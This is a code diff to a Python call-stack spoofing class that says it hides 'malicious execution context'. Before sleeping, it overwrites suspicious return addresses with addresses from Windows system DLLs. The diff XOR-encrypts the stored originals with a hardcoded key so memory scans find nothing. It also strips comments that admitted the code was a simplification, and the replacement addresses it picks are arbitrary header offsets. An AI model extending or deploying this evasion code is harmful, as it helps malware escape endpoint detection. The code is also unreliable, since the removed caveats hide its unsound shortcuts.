@@ -12,6 +12,7 @@ Solution:
 - Before sleep: walk stack, replace malicious frames with legitimate DLL addresses
 - After wake: restore original stack
 - Uses RBP/EBP chain walking + Windows debug context manipulation
+- Original return addresses are XOR-encrypted before storage (no plaintext in heap)
 
 Techniques:
 1. Frame Replacement: Replace Python/runtime frames with kernel32/ntdll addresses
@@ -31,6 +32,7 @@ import ctypes.wintypes
 import platform
 import sys
 import threading
+import os
 from typing import Optional, Dict, List, Tuple
 from dataclasses import dataclass
 from enum import Enum
@@ -57,15 +59,17 @@ class SpoofResult:
 class CallStackSpoofer:
     """
     Spoofs thread call stack to hide malicious execution context.
+    Original return addresses are XOR-encrypted before storage.
     """
 
     def __init__(self):
         self._system = platform.system()
         self._enabled = False
-        self._original_frames: List[Tuple[int, int]] = []  # (offset, original_addr)
+        self._original_frames: List[Tuple[int, int]] = []  # (offset, encrypted_original_addr)
         self._kernel32 = None
         self._ntdll = None
         self._legitimate_addrs: List[int] = []
+        self._encryption_key: bytes = b"M0N0L1TH_STACK_SPOOF_KEY_2026"
 
         if self._system == "Windows":
             self._kernel32 = ctypes.windll.kernel32
@@ -101,9 +105,10 @@ class CallStackSpoofer:
         try:
             ctx = self._get_thread_context()
             if ctx:
-                # Restore original frames
-                for offset, original_addr in self._original_frames:
+                # Restore original frames (decrypt first)
+                for offset, encrypted_original_addr in self._original_frames:
                     try:
+                        original_addr = self._decrypt_addr(encrypted_original_addr)
                         addr_ptr = ctypes.c_void_p.from_address(offset)
                         addr_ptr.value = original_addr
                     except Exception:
@@ -125,6 +130,17 @@ class CallStackSpoofer:
     # =========================================================================
     # INTERNALS
     # =========================================================================
+    def _encrypt_addr(self, addr: int) -> int:
+        """XOR-encrypt an address before storage."""
+        key_bytes = self._encryption_key
+        addr_bytes = addr.to_bytes(8, byteorder='little')
+        encrypted = bytes([addr_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(8)])
+        return int.from_bytes(encrypted, byteorder='little')
+
+    def _decrypt_addr(self, encrypted_addr: int) -> int:
+        """XOR-decrypt an address after retrieval."""
+        return self._encrypt_addr(encrypted_addr)  # XOR is symmetric
+
     def _collect_legitimate_addresses(self):
         """Collect return addresses from legitimate Windows modules."""
         try:
@@ -140,10 +156,7 @@ class CallStackSpoofer:
                 h_mod = self._kernel32.GetModuleHandleA(mod_name)
                 if not h_mod:
                     continue
-                # Walk exports to get function addresses
-                # We just need valid code addresses within the module
                 base = h_mod
-                # Collect a few addresses from the module header area
                 for offset in range(0x1000, 0x5000, 0x10):
                     addr = base + offset
                     if addr not in self._legitimate_addrs:
@@ -213,8 +226,9 @@ class CallStackSpoofer:
                 ret_addr = ret_addr_ptr.value
 
                 if ret_addr and self._is_suspicious_address(ret_addr):
-                    # Save original
-                    self._original_frames.append((rbp + 8, ret_addr))
+                    # Save original (ENCRYPTED)
+                    encrypted_original = self._encrypt_addr(ret_addr)
+                    self._original_frames.append((rbp + 8, encrypted_original))
                     # Replace with legitimate address
                     ret_addr_ptr.value = next(legit_iter, self._legitimate_addrs[0])
                     spoofed += 1
@@ -249,7 +263,6 @@ class CallStackSpoofer:
                 return False
 
         # If address is not in any known DLL range, mark as suspicious
-        # This is a simplification; real impl would query module list
         return True
 
 
@@ -276,3 +289,4 @@ class SpoofedSleepMixin:
         finally:
             if spoofer._enabled:
                 spoofer.disable()
+
